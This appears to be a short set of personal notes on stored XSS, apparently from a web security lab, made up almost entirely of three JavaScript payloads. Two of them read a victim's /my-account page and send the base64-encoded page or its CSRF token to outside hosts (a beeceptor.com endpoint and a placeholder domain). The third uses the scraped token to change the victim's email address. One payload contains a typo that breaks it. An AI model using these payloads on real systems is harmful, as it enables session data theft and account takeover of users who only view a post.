// Stored XSS leading to CSRF Token Theft 
// When a user views the post, they unintentionally send a request to my-account, and the response is sent to a DNS server (which will return data from their account). In the following script, we’ll steal their csrf_token so we can manually do whatever we want with their account.
<script>
  var req = new XMLHttpRequest();
  req-open("GET", "/my-account", false);
  req.send();
  var response = req.responseText;
  var req2 = new XMLHttpRequest();
  req2.open('GET', "https://ejericio2.free.beeceptor.com?response=" + btoa(response));
  req2.send();
</script>

<script>
  var req = new XMLHttpRequest();
  req.open('get','/my-account', false);
  req.send();
  var response = req.responseText;
  var csrf_token = response.match(/name="csrf" value="(.*?)"/)[1];
  var req2 = new XMLHttpRequest();
  req2.open('GET', "https://my.domain.com?token=" + csrf_token);
  req2.send();
</script>


// When a user views the post, they can submit a request to my-account, which will then directly process the email change to test@test.com
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(.*?)"/)[1];
    var changeReq = new XMLHttpRequest();
    var data = "email=" + encodeURIComponent("testing@test.com") + "&csrf=" + encodeURIComponent(token);
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    changeReq.send(data)
};
</script>
